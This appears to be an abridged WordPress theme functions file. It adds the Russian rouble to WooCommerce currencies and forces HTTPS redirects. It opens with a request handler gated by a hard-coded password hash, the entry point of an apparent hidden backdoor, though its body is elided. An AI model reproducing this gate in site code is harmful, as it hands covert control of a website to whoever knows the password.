<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'be6b923d34cf44eea5690790223d40bc'))
	{
...
function add_my_currency( $currencies ) {
     ...
     $currencies['RUB'] = __( 'Российский рубль', 'woocommerce' );
...
function force_https () {
	...
	if (preg_match ( '/^www\.(.*)$/iu', $_SERVER['HTTP_HOST'], $www )) {
		wp_redirect('https://' . $www[1] . $_SERVER['REQUEST_URI'], 301 );
		exit();
	}
	elseif ( !is_ssl() ) {
...
add_action ( 'template_redirect', 'force_https', 2 );
